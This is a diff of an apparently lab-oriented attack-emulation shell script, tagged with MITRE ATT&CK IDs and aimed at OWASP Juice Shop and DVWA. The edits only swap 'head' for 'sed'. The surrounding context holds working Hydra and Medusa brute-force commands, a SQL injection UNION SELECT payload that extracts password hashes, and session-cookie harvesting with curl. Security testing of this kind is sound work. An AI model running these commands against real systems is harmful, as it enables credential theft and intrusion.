@@ -20,12 +20,12 @@ hydra -L /tmp/mitre-users-$$.txt \
   -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
   "$TARGET" http-post-form \
   "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid:H=Content-Type\: application/json" \
-  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | head -5
+  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | sed -n '1,5p'
 echo ""
 
 echo "  [T1110.001.b] Medusa against DVWA:"
 medusa -h "$TARGET" -u admin -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
-  -M http -m "DIR:/dvwa/login.php" -n 80 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | head -5
+  -M http -m "DIR:/dvwa/login.php" -n 80 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | sed -n '1,5p'
 echo ""
 
 echo "=== T1110.003: Brute Force — Password Spraying ==="
@@ -76,7 +76,7 @@ echo "    Technique: SQLi to extract password hashes"
 resp=$(curl -sf "${BASE}/juice-shop/rest/products/search?q=test'))UNION+SELECT+id,email,password,'4','5','6','7','8','9'+FROM+Users--" --max-time 10 2>/dev/null)
 if echo "$resp" | grep -qiE "(\\\$2[aby]|md5|[a-f0-9]{32})" 2>/dev/null; then
   echo "  [VULN] T1212 Password hashes extracted via UNION SELECT"
-  echo "$resp" | jq -r '.data[]? | "\(.email // .id): \(.password // "N/A")"' 2>/dev/null | head -5
+  echo "$resp" | jq -r '.data[]? | "\(.email // .id): \(.password // "N/A")"' 2>/dev/null | sed -n '1,5p'
 else
   printf '  [INFO] T1212 UNION SELECT attempted (response: %sB)\n' "${#resp}"
 fi
@@ -85,7 +85,7 @@ echo ""
 echo "=== T1539: Steal Web Session Cookie ==="
 echo "    Technique: Session fixation and cookie analysis"
 echo "  DVWA session cookie analysis:"
-curl -sf -v "${BASE}/dvwa/login.php" 2>&1 | grep -i "set-cookie" | head -3
+curl -sf -v "${BASE}/dvwa/login.php" 2>&1 | grep -i "set-cookie" | sed -n '1,3p'
 echo ""
 echo "  Cookie security flags check:"
 curl -sf -I "${BASE}/dvwa/login.php" 2>/dev/null | grep -i "set-cookie" | while read -r line; do
